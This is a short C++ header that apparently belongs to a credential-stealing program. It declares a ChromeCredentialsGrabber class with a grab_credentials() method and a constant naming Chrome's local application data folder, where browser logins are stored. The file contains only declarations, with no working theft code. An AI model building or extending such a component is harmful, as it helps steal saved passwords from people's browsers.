#pragma once
#include "CredentialsGrabber.hpp"

class ChromeCredentialsGrabber final : public CredentialsGrabber
{
public:
	explicit ChromeCredentialsGrabber() = default;
	~ChromeCredentialsGrabber() override = default;
	ChromeCredentialsGrabber(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber& operator=(const ChromeCredentialsGrabber&) = delete;
	ChromeCredentialsGrabber(ChromeCredentialsGrabber&&) = delete;
	ChromeCredentialsGrabber& operator=(ChromeCredentialsGrabber&&) = delete;

	[[nodiscard]] std::optional<Credentials> grab_credentials() const override;
	[[nodiscard]] std::wstring source() const override;

private:
	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";
};
